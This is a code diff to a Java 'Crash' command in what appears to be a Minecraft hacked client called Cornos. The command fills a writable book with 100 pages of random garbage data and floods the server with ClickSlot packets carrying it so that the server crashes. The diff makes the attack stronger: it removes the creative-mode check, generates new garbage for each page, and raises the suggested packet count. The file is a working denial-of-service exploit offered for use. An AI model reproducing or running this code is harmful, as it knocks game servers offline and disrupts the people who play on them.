@@ -9,10 +9,8 @@ import net.minecraft.nbt.CompoundTag;
 import net.minecraft.nbt.ListTag;
 import net.minecraft.nbt.StringTag;
 import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
-import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import net.minecraft.screen.slot.SlotActionType;
 
-import java.util.Objects;
 import java.util.Random;
 
 public class Crash extends Command {
@@ -24,7 +22,7 @@ public class Crash extends Command {
     @Override
     public void onExecute(String[] args) {
         if (args.length == 0) {
-            ClientHelper.sendChat("Could you like provide the amount of packets to send? (~ 20 is pog)");
+            ClientHelper.sendChat("Could you like provide the amount of packets to send? (~ 40 is pog)");
             return;
         }
         int amount;
@@ -34,24 +32,19 @@ public class Crash extends Command {
             ClientHelper.sendChat("Im not sure if " + args[0] + " a number");
             return;
         }
-        assert Cornos.minecraft.player != null;
-        if (!Cornos.minecraft.player.isCreative()) {
-            ClientHelper.sendChat("It would be helpful if you are in creative. Trying anyways");
-        }
         ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
         CompoundTag tag = stack.getOrCreateTag();
         ListTag list = new ListTag();
-        String garbage = createGarbageData(600, 0, 1000);
         for (int i = 0; i < 100; i++) {
-            StringTag st = StringTag.of(garbage);
+            StringTag st = StringTag.of(createGarbageData(600, 0, 1000));
             list.add(st);
         }
         tag.put("author", StringTag.of(Cornos.minecraft.player.getEntityName()));
-        tag.put("title", StringTag.of("When you use cornos :flushed:"));
+        tag.put("title", StringTag.of("\n the server \n needs \n a schmoke \n"));
         tag.put("pages", list);
         stack.setTag(tag);
         for (int i = 0; i < amount; i++) {
-            Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(new CreativeInventoryActionC2SPacket(0, stack));
+            //Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(new CreativeInventoryActionC2SPacket(0, stack));
             Cornos.minecraft.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.PICKUP, stack, (short) 0));
         }
         super.onExecute(args);
